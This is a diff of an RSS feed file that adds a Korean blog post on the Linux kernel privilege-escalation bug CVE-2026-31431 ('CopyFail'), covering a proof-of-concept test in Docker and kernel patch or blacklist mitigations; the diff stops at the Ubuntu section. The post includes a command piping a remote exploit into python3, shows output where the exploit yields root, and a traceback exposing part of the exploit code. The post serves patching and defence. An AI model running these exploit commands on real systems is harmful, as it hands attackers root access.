@@ -4,19 +4,212 @@
     <title>dev RSS - Awesome Blogs</title>
     <link>https://awesome-blogs.petabytes.org</link>
     <description>Awesome Blogs RSS 피드</description>
-    <lastBuildDate>Mon, 11 May 2026 17:44:15 GMT</lastBuildDate>
+    <lastBuildDate>Tue, 12 May 2026 17:50:15 GMT</lastBuildDate>
     <item>
       <title>아주 천천히 10만 명에 도달하는 것도 멋진 일이니까요</title>
       <link>https://jeho.page/essay/2026/05/07/50000-services.html</link>
       <guid>https://jeho.page/essay/2026/05/07/50000-services.html</guid>
-      <pubDate>Mon, 11 May 2026 17:23:28 GMT</pubDate>
+      <pubDate>Tue, 12 May 2026 17:08:45 GMT</pubDate>
       <content:encoded>플레이스토어와 앱스토어의 다운로드 수와 리뷰를 돈 주고 사는 어플들이 꽤나 있습니다. (앱을 올려보신 분들은 알겠지만 이메일 주소를 보고 업자들에게 이메일이 계속 옵니다.)</content:encoded>
+    </item>
+    <item>
+      <title>Linux CopyFail 취약점 패치, CVE-2026-31431</title>
+      <link>https://sunyzero.tistory.com/328</link>
+      <guid>https://sunyzero.tistory.com/328</guid>
+      <pubDate>Tue, 12 May 2026 17:08:45 GMT</pubDate>
+      <content:encoded>
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;2026년 4월말 리눅스 커널에 치명적인 보안 버그인 일명 CopyFail &lt;span style=&quot;color: #ee2323;&quot;&gt;CVE-2026-31431&lt;/span&gt;이 발표되었다. 이 글에서는 CopyFail의 간단한 소개와 보안 버그에 해당하는지 PoC 테스트하는 방법 및 보안 패치, 완화 처치 방안에 대해 다룬다. 특히 커널 업그레이드나 blacklist 처리 방법에 대해서 자세히 다루도록 한다.&lt;/span&gt;&lt;/p&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&amp;nbsp;&lt;/p&gt;
+        &lt;h2 data-ke-size=&quot;size26&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;1. CopyFail CVE-2026-31431이란?&lt;/span&gt;&lt;/h2&gt;
+        &lt;p&gt;&lt;figure class=&quot;imageblock alignCenter&quot; data-ke-mobileStyle=&quot;widthOrigin&quot; data-filename=&quot;copyfail_poc_demo.png&quot; data-origin-width=&quot;1222&quot; data-origin-height=&quot;921&quot;&gt;&lt;span data-url=&quot;https://blog.kakaocdn.net/dn/X2g3D/dJMcadBTvKR/FdMBrIYLIhec8dslSgIXKk/img.png&quot; data-phocus=&quot;https://blog.kakaocdn.net/dn/X2g3D/dJMcadBTvKR/FdMBrIYLIhec8dslSgIXKk/img.png&quot; data-alt=&quot;CopyFail CVE-2026-31431 PoC demo (출처 : copy.fail)&quot;&gt;&lt;img src=&quot;https://blog.kakaocdn.net/dn/X2g3D/dJMcadBTvKR/FdMBrIYLIhec8dslSgIXKk/img.png&quot; srcset=&quot;https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&amp;fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FX2g3D%2FdJMcadBTvKR%2FFdMBrIYLIhec8dslSgIXKk%2Fimg.png&quot; onerror=&quot;this.onerror=null; this.src=&apos;//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png&apos;; this.srcset=&apos;//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png&apos;;&quot; loading=&quot;lazy&quot; width=&quot;1222&quot; height=&quot;921&quot; data-filename=&quot;copyfail_poc_demo.png&quot; data-origin-width=&quot;1222&quot; data-origin-height=&quot;921&quot;/&gt;&lt;/span&gt;&lt;figcaption&gt;CopyFail CVE-2026-31431 PoC demo (출처 : copy.fail)&lt;/figcaption&gt;
+        &lt;/figure&gt;
+        &lt;/p&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;CopyFail은&amp;nbsp;2017년에&amp;nbsp;커널에&amp;nbsp;도입된&amp;nbsp;기능으로서&amp;nbsp;최근에서야&amp;nbsp;발견되었기&amp;nbsp;때문에&amp;nbsp;현재&amp;nbsp;대부분의&amp;nbsp;리눅스가&amp;nbsp;영향을&amp;nbsp;받는다. &lt;/span&gt;&lt;br /&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;이 취약점은 2026년 4월 29일 공개되었고, AI를 사용하여 취약점을 발견하는 보안팀인 Xint Code에 의해 공개되었다.[1]&lt;/span&gt;&lt;/p&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;CopyFail 취약점은 로컬 권한 상승(Local Privilege Escalation) 취약점으로, 커널의 암호화를 위한 algif_aead에서 splice 시스템 콜을 처리할 때 하드웨어 가속을 일반 유저에게도 사용할 수 있게 해주던 기능이다. 일반 유저도 커널의 기능을 쉽게 사용할 수 있도록 만들어졌지만, 역으로 커널 레벨에서 관리자 권한을 훔칠 수 있게 되었다.&lt;/span&gt;&lt;/p&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;현재 AWS나 대부분의 호스팅 업체에서 사용하는 Fedora계열, RH계열(Rocky, Alma, SuSe, 구형 CentOS...), Debian계열(Debian, Ubuntu, Mint ...) 등등 거의 모든 리눅스가 CopyFail 취약점을 가지고 있다. 특히 RH계열(레드햇 계열)은 algif_aead 커널 기능을 module이 아닌 builtin으로 넣어두었기 때문에 더욱 위험하다고 볼 수 있다.&lt;/span&gt;&lt;/p&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;이 취약점은 일단 로컬 유저로 액세스한 뒤에 root 권한을 훔칠 수 있기에 덜 위험하다고 생각될수도 있지만 의존성으로 인해 설치되는 각종 패키지나 혹은 curl | sh 방식으로 프로그램 설치를 유도한 뒤에 시스템에 잠입해서 쉽게 root권한을 훔치는 다양한 공격을 취할 수 있기 때문에 되도록이면 빨리 패치해야만 한다.&lt;/span&gt;&lt;/p&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&amp;nbsp;&lt;/p&gt;
+        &lt;h2 data-ke-size=&quot;size26&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;2. CopyFail PoC 테스트 방법&lt;/span&gt;&lt;/h2&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;앞서 이야기 했듯이 2017년에 도입된 기능이므로 현재 사용되는 거의 모든 리눅스가 취약하다고 볼 수 있다. 그럼에도&amp;nbsp;불구하고&amp;nbsp;자신의&amp;nbsp;리눅스&amp;nbsp;시스템에서&amp;nbsp;확인하고자&amp;nbsp;한다면&amp;nbsp;다음과&amp;nbsp;같이&amp;nbsp;확인해볼&amp;nbsp;수&amp;nbsp;있다.&lt;/span&gt;&lt;/p&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&amp;nbsp;&lt;/p&gt;
+        &lt;h3 data-ke-size=&quot;size23&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;2.1. PoC 코드 (주의!. &lt;span style=&quot;color: #ee2323;&quot;&gt;운영 환경에서 사용하지 말 것&lt;/span&gt;)&lt;/span&gt;&lt;/h3&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;첫번째로 이 취약점을 발견한 Theori의 웹사이트에서는 다음과 같은 명령으로 PoC를 해볼 수 있다. Python 3.10이상에서 사용가능하며, &lt;span style=&quot;color: #ee2323;&quot;&gt;이 PoC를 실행하면 su 명령이 암호없이 뚫리는 상태가 되므로 운영 환경에서는 실습하지 않도록 주의해야 한다&lt;/span&gt;.&lt;/span&gt;&lt;/p&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;다시 말하지만 운영환경에서는 함부로 실행해보면 안된다. 만일 실행했다면 &lt;span style=&quot;background-color: #f6e199;&quot;&gt;echo 3 &amp;gt; /proc/sys/vm/drop_caches&lt;/span&gt;로 페이지 캐시를 비워주면 복구되는 경우도 간혹 있지만, 만일 복구가 안된다면 리부팅을 해야만 오염된 페이지 캐시가 제거된다. 따라서 copyfail PoC는 절대로 운영환경에서 실행하면 안된다.&lt;/span&gt;&lt;/p&gt;
+        &lt;pre id=&quot;code_1778571178545&quot; class=&quot;bash&quot; data-ke-language=&quot;bash&quot; data-ke-type=&quot;codeblock&quot;&gt;&lt;code&gt;curl https://copy.fail/exp | python3 &amp;amp;&amp;amp; su&lt;/code&gt;&lt;/pre&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;CopyFail의 PoC 원리는 AF_ALG 소켓을 열고, setuid(0) 코드를 페이지 캐시에 오염시켜서 su 명령시 root 권한으로 명령을 실행하게 한다. 따라서 PoC가 성공한 뒤에는 어떤 유저든지 su 명령시 권한이 상승되어 root 패스워드가 필요없어진다.&lt;/span&gt;&lt;/p&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&amp;nbsp;&lt;/p&gt;
+        &lt;h3 data-ke-size=&quot;size23&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;2.2. Docker를 이용한 테스트 (&lt;span style=&quot;background-color: #9feec3;&quot;&gt;안전한 취약점 테스트 방법&lt;/span&gt;)&lt;/span&gt;&lt;/h3&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;이 방법은 docker를 이용해서 container에서 PoC를 실행시키는 방법으로, 컨테이너가 host의 algif_aead를 사용하지만 오염시키는 su가 container 안에 있는 su 바이너리라는 점이 다르다. 그리고 container를 제거하기 전에 fadvise로 오염된 컨테이너의 su의 페이지 캐시를 제거하는 구조를 사용한다. &lt;span style=&quot;color: #0593d3;&quot;&gt;이렇게 하면 container를 통해 1회성으로 취약점 PoC 테스트를 해볼 수 있다&lt;/span&gt;.&lt;/span&gt;&lt;/p&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;이 테스트 방법은 먼저 docker가 설치되어있어야 한다. 보통 docker-ce를 설치하므로 여기서도 docker-ce가 설치된 시스템을 기준으로 설명한다. 혹시라도&amp;nbsp;설치되어있지&amp;nbsp;않다면&amp;nbsp;&quot;install&amp;nbsp;docker-ce&amp;nbsp;on&amp;nbsp;&amp;lt;배포판&amp;gt;&quot;으로&amp;nbsp;검색하면&amp;nbsp;바로&amp;nbsp;상단에&amp;nbsp;나올&amp;nbsp;것이다.&amp;nbsp;예를&amp;nbsp;들어&amp;nbsp;Rocky&amp;nbsp;리눅스라면&amp;nbsp;&quot;install&amp;nbsp;docker-ce&amp;nbsp;on&amp;nbsp;rocky&amp;nbsp;linux&quot;로&amp;nbsp;검색하면&amp;nbsp;된다.&amp;nbsp;아니면&amp;nbsp;AI에게&amp;nbsp;질문해도&amp;nbsp;된다.&lt;/span&gt;&lt;/p&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&amp;nbsp;&lt;/p&gt;
+        &lt;h4 data-ke-size=&quot;size20&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;2.2.1. 준비 과정&lt;/span&gt;&lt;/h4&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;먼저 docker 실행 권한을 가진 일반 유저로 2개의 테스트용 파일(Dockerfile, docker-compose.yml)을 만든다. 적당한 디렉토리를 하나 만들고 그 안에 만들면 편리할 것이다. 아래는 파일을 redirect로 생성하는 명령어로서 복사해서 붙여넣으면 파일이 만들어진다.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;
+        &lt;pre id=&quot;code_1778571450636&quot; class=&quot;bash&quot; data-ke-language=&quot;bash&quot; data-ke-type=&quot;codeblock&quot;&gt;&lt;code&gt;cat &amp;lt;&amp;lt;HERE &amp;gt;Dockerfile
+        FROM python:3.10-slim
+        RUN apt-get update &amp;amp;&amp;amp; apt-get install -y --no-install-recommends \
+        curl passwd &amp;amp;&amp;amp; rm -rf /var/lib/apt/lists/*
+        HERE&lt;/code&gt;&lt;/pre&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;위의 첫번째 명령어를 복사해서 붙여넣어 실행하면 Dockerfile이 생성되고, 아래 두번째 명령어를 복붙해서 실행하면 docker-compose.yml 파일이 생성될 것이다.&lt;/span&gt;&lt;/p&gt;
+        &lt;pre id=&quot;code_1778571502234&quot; class=&quot;bash&quot; data-ke-language=&quot;bash&quot; data-ke-type=&quot;codeblock&quot;&gt;&lt;code&gt;cat &amp;lt;&amp;lt;HERE &amp;gt;docker-compose.yml
+        services:
+        copyfail-test:
+        build: .
+        container_name: copyfail_test
+        privileged: true
+        stdin_open: true  # -i option
+        tty: true         # -t option
+        command: |
+        bash -c &quot;
+        useradd -m sunyzero -s /bin/bash
+        echo &apos;sunyzero:qwer1234&apos; | chpasswd
+        echo &apos;root:rootqwer1234&apos; | chpasswd
+        curl -L https://copy.fail/exp &amp;gt; ~sunyzero/copyfail_poc.py
+        chown sunyzero:sunyzero /home/sunyzero/copyfail_poc.py
+        echo &apos;To test exploit(CopyFail,CVE-2026-31431)&apos;
+        echo &apos;   Run:    python3 ~/copyfail_poc.py&apos;
+        echo &apos;===================[ Ready for your command ]=====================&apos;
+        su - sunyzero
+        # 종료 후 fadvise로 su의 page cache를 비우도록 함.
+        python3 -c \&quot;
+        import os
+        fd = os.open(&apos;/usr/bin/su&apos;, os.O_RDONLY)
+        os.posix_fadvise(fd, 0, 0, os.POSIX_FADV_DONTNEED)
+        os.close(fd)
+        \&quot;
+        sync
+        &quot;
+        HERE&lt;/code&gt;&lt;/pre&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;2개의 파일이 생성된 다음에는 이제 실행을 해야 할 것이다.&lt;/span&gt;&lt;/p&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&amp;nbsp;&lt;/p&gt;
+        &lt;h4 data-ke-size=&quot;size20&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;2.2.2. PoC를 컨테이너에서 실행&lt;/span&gt;&lt;/h4&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;컨테이너는 다음과 같은 명령어로 실행한다. 명령어에는 --rm 옵션을 추가해서 컨테이너를 종료하는 즉시 삭제되도록 한다.&lt;/span&gt;&lt;/p&gt;
+        &lt;pre id=&quot;code_1778571582331&quot; class=&quot;bash&quot; data-ke-language=&quot;bash&quot; data-ke-type=&quot;codeblock&quot;&gt;&lt;code&gt;$ docker compose run --rm copyfail-test
+        ...생략...
+        To test exploit(CopyFail,CVE-2026-31431),
+        Run:    python3 ~/copyfail_poc.py
+        ===================[ Ready for your command ]=====================
+        sunyzero@e31dfcc7a99d:~$ ls
+        copyfail_poc.py
+        sunyzero@e31dfcc7a99d:~$ id
+        uid=1000(sunyzero) gid=1000(sunyzero) groups=1000(sunyzero)
+        sunyzero@e31dfcc7a99d:~$ su -
+        Password:   # 정상적으로 password를 묻는 상태이므로 Ctrl-C로 취소한다.
+        
+        $ python3 ~/copyfail_poc.py
+        # id
+        uid=0(root) gid=1000(sunyzero) groups=1000(sunyzero)&lt;/code&gt;&lt;/pre&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;컨테이너 안에서 내린 명령어를 보면 먼저 ls로 copyfail_poc.py 파일이 저장되어있는지 확인을 했다.&lt;/span&gt;&lt;/p&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;그 다음에 id 명령으로 sunyzero 로컬 유저의 UID, GID를 확인했다. 결과를 보면 &lt;span style=&quot;background-color: #f6e199;&quot;&gt;uid=1000(sunyzero) ...&lt;/span&gt; 로 일반 유저로 보이고 있다.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;그리고나서 su - 명령을 내려보면 패스워드를 묻는 &lt;span style=&quot;background-color: #9feec3;&quot;&gt;&quot;Password: &quot;&lt;/span&gt; 프롬프트가 제대로 보이고 있다. 즉 암호 체크가 제대로 작동중인 안전한 상태인 것이다. 아직 PoC를 실행하지 않은 상태에서 정상인지 확인했으니, Ctrl-C로 취소한다.&lt;/span&gt;&lt;/p&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;그 다음에는 PoC 코드인 &lt;span style=&quot;background-color: #ffc1c8;&quot;&gt;python3 ~/copyfail_poc.py&lt;/span&gt;를 실행하면 root 계정이 탈취되는지 확인할 수 있다. 위의 경우에는 id에 uid=0(root)가 나오는 것으로 보이므로 로컬 권한 상승으로 root 계정이 탈취당했음을 알 수 있다. 안전하게 보안 패치된 시스템에서는 패스워드를 묻는 프롬프트가 나와서 로컬 권한 상승을 막는다. 혹은 완화 처리(mitigation)된 시스템에서는 오류가 발생하도록 되어있다.&lt;/span&gt;&lt;/p&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;취약점이 존재하여 root를 탈취당하는 시스템이라면 아래와 같이 copyfail 보안 패치나 완화 방법을 사용해야 한다. 여기서는 Fedora, Rocky, Ubuntu별로 따로 설명하도록 한다.&lt;/span&gt;&lt;/p&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&amp;nbsp;&lt;/p&gt;
+        &lt;h2 data-ke-size=&quot;size26&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;3. CopyFail 보안 패치 방법&lt;/span&gt;&lt;/h2&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;레드햇 계열(Fedora, Rocky, Alma ...)들은 algif_aead가 커널에 builtin되어있고, 데비안 계열(Debian, Ubuntu, Mint...)들은 module로 되어있어서 패치 방법이 조금은 다르다.&lt;/span&gt;&lt;/p&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;레드햇 계열에서는 패치된 커널로 업그레이드하거나 아니면 boot parameter에서 blacklist로 해당 기능을 처리하는 완화 방법(mitigation)이 주로 쓰이고, 데비안 계열은 module이라 간단하게 blacklist 환경 설정 파일만 설정해주면 된다.&lt;/span&gt;&lt;/p&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;우선 커널에 AEAD이 존재하는지는 /boot/config-$(uname -r)파일이나 modinfo로 쉽게 알 수 있다. 아래는 레드햇 계열에서 살펴본 것으로 modinfo에서 filename이 builtin으로 나오는 것을 볼 수 있다.&lt;/span&gt;&lt;/p&gt;
+        &lt;pre id=&quot;code_1778573316663&quot; class=&quot;routeros&quot; style=&quot;background-color: #f8f8f8; color: #383a42; text-align: start;&quot; data-ke-type=&quot;codeblock&quot; data-ke-language=&quot;bash&quot;&gt;&lt;code&gt;$ grep CONFIG_CRYPTO_USER_API_AEAD /boot/config-$(uname -r)
+        CONFIG_CRYPTO_USER_API_AEAD=y
+        
+        $ modinfo algif_aead
+        name:           algif_aead
+        filename:       (builtin)
+        description:    AEAD kernel crypto API user space interface
+        author:         Stephan Mueller &amp;lt;smueller@chronox.de&amp;gt;
+        license:        GPL
+        file:           crypto/algif_aead&lt;/code&gt;&lt;/pre&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;우분투는 filename에 경로가 나오는 것으로 봐서 kernel module임을 알 수 있다.&lt;/span&gt;&lt;/p&gt;
+        &lt;pre id=&quot;code_1778573609155&quot; class=&quot;bash&quot; data-ke-language=&quot;bash&quot; data-ke-type=&quot;codeblock&quot;&gt;&lt;code&gt;$ modinfo algif_aead
+        filename:       /lib/modules/5.15.0-144-generic/kernel/crypto/algif_aead.ko
+        description:    AEAD kernel crypto API user space interface
+        author:         Stephan Mueller &amp;lt;smueller@chronox.de&amp;gt;&amp;lt;/smueller@chronox.de&amp;gt;
+        license:        GPL
+        srcversion:     F89A7DE8CA18E13AB028AA1
+        ...생략...&lt;/code&gt;&lt;/pre&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&amp;nbsp;&lt;/p&gt;
+        &lt;h3 data-ke-size=&quot;size23&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;3.1. Fedora 리눅스 (레드햇 계열)&lt;/span&gt;&lt;/h3&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;페도라 리눅스에서는 이 글을 쓰는 시점인 5월 9일경 확인한 결과 6.19.14-300에 이어 7.0.4 커널이 올라왔으나 해결은 아직 안된 상태이다. 그럼에도&amp;nbsp;불구하고&amp;nbsp;다른&amp;nbsp;취약점이&amp;nbsp;패치되어있기&amp;nbsp;때문에&amp;nbsp;커널을&amp;nbsp;업데이트&amp;nbsp;해주는&amp;nbsp;것을&amp;nbsp;추천한다.&lt;/span&gt;&lt;/p&gt;
+        &lt;pre id=&quot;code_1778572015839&quot; class=&quot;bash&quot; data-ke-language=&quot;bash&quot; data-ke-type=&quot;codeblock&quot;&gt;&lt;code&gt;sudo dnf -y update kernel&lt;/code&gt;&lt;/pre&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;&lt;span style=&quot;background-color: #f6e199;&quot;&gt;커널 업데이트 후에는 reboot를 해야만 한다.&lt;/span&gt; 패치가 제대로 되었다면 docker로 PoC 실행시 다음과 같이 root 로 권한이 상승되지 못하고 패스워드를 묻는 프롬프트인 &quot;Password: &quot;가 나타나게 된다. 아래 테스트는 페도라43, 페도라44에서 테스트 되었다.&lt;/span&gt;&lt;/p&gt;
+        &lt;pre id=&quot;code_1778572520220&quot; class=&quot;bash&quot; data-ke-language=&quot;bash&quot; data-ke-type=&quot;codeblock&quot;&gt;&lt;code&gt;$ docker compose run --rm copyfail-test 
+        Container copyfail-poc-docker-copyfail-test-run-3e60658ad202 Creating 
+        Container copyfail-poc-docker-copyfail-test-run-3e60658ad202 Created 
+        % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+        Dload  Upload   Total   Spent    Left  Speed
+        100   731    0   731    0     0   4615      0 --:--:-- --:--:-- --:--:--  4626
+        To test exploit(CopyFail,CVE-2026-31431)
+        Run:    python3 ~/copyfail_poc.py
+        ===================[ Ready for your command ]=====================
+        sunyzero@f1afcd499e5d:~$ python3 ~/copyfail_poc.py
+        Password:&lt;/code&gt;&lt;/pre&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&amp;nbsp;&lt;/p&gt;
+        &lt;h3 data-ke-size=&quot;size23&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;3.2. Rocky 리눅스 (레드햇 계열)&lt;/span&gt;&lt;/h3&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;Rocky 리눅스는 이 글을 처음 쓰던 시점에서는 grubby로 부팅 시점에 algif_aead_init 모듈을 blacklist 처리하는 boot parameter를 추가하는 완화 방법으로 처리하도록 안내하고 있었으나, 중간에 5월 9~10일경에 패치된 커널이 올라왔다.[2] 따라서 아래 커널 업그레이드 방법(Plan A)로 처리하는 것을 추천한다.&lt;/span&gt;&lt;/p&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&amp;nbsp;&lt;/p&gt;
+        &lt;h4 data-ke-size=&quot;size20&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;3.2.1. 커널 업그레이드 방법 (Plan A)&lt;/span&gt;&lt;/h4&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;Rocky Linux는 5월 8~10일 경에는 대부분의 버전을 패치했으므로 커널 업그레이드 방법으로 쉽게 해결할 수 있다. 방법은 페도라 리눅스와 같다. 테스트는 로키 리눅스 10.1에서 테스트 되었다.&lt;/span&gt;&lt;/p&gt;
+        &lt;pre id=&quot;code_1778572201110&quot; class=&quot;bash&quot; data-ke-language=&quot;bash&quot; data-ke-type=&quot;codeblock&quot;&gt;&lt;code&gt;sudo dnf -y update kernel&lt;/code&gt;&lt;/pre&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;커널 업데이트가 완료된 후에는 reboot를 해줘야만 한다. 리부팅 뒤에도 앞서 docker로 PoC를 검사하는 부분을 체크해보는 것을 권장한다.&lt;/span&gt;&lt;/p&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&amp;nbsp;&lt;/p&gt;
+        &lt;h4 data-ke-size=&quot;size20&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;3.2.2. grubby로 부트 파라메터 조작 방법 (Plan B)&lt;/span&gt;&lt;/h4&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;Plan B 방법은 커널 업그레이드가 용이하지 않을 때 사용하는 방법이다. 하지만 되도록이면 위 플랜A인 커널 업그레이드를 권장한다. 이 기능은 grubby를 사용하므로 root 권한으로 명령한다.&lt;/span&gt;&lt;/p&gt;
+        &lt;pre id=&quot;code_1778572299542&quot; class=&quot;bash&quot; data-ke-language=&quot;bash&quot; data-ke-type=&quot;codeblock&quot;&gt;&lt;code&gt;sudo grubby --args initcall_blacklist=algif_aead_init --update-kernel=ALL&lt;/code&gt;&lt;/pre&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;플랜B는 algif_aead를 커널 레벨에서 블랙리스트 처리하므로 docker PoC로 실행해보면 아래처럼 에러가 발생한다.&lt;/span&gt;&lt;/p&gt;
+        &lt;pre id=&quot;code_1778573430137&quot; class=&quot;bash&quot; data-ke-language=&quot;bash&quot; data-ke-type=&quot;codeblock&quot;&gt;&lt;code&gt;$ docker compose run --rm copyfail-test
+        Container sunyzero-copyfail-test-run-b5913c93ffa3 Creating
+        Container sunyzero-copyfail-test-run-b5913c93ffa3 Created
+        % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+        Dload  Upload   Total   Spent    Left  Speed
+        100   731    0   731    0     0   2044      0 --:--:-- --:--:-- --:--:--  2041
+        To test exploit(CopyFail,CVE-2026-31431)
+        Run:    python3 ~/copyfail_poc.py
+        ===================[ Ready for your command ]=====================
+        sunyzero@c18f31aee811:~$  python3 ~/copyfail_poc.py
+        Traceback (most recent call last):
+        File &quot;/home/sunyzero/copyfail_poc.py&quot;, line 9, in 
+        while i
+        File &quot;/home/sunyzero/copyfail_poc.py&quot;, line 5, in c
+        a=s.socket(38,5,0);a.bind((&quot;aead&quot;,&quot;authencesn(hmac(sha256),cbc(aes))&quot;));h=279;v=a.setsockopt;v(h,1,d(&apos;0800010000000010&apos;+&apos;0&apos;*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d(&apos;00&apos;);u.sendmsg([b&quot;A&quot;*4+c],[(h,3,i*4),(h,2,b&apos;\x10&apos;+i*19),(h,4,b&apos;\x08&apos;+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
+        FileNotFoundError: [Errno 2] No such file or directory
+        sunyzero@c18f31aee811:~$&lt;/code&gt;&lt;/pre&gt;
+        &lt;p data-ke-size=&quot;size16&quot;&gt;&amp;nbsp;&lt;/p&gt;
+        &lt;h3 data-ke-size=&quot;size23&quot;&gt;&lt;span style=&quot;font-family: Noto Sans Demilight, Noto Sans KR;&quot;&gt;3.3. Ubuntu 리눅스&lt;/span&gt;&lt;/h3&gt;
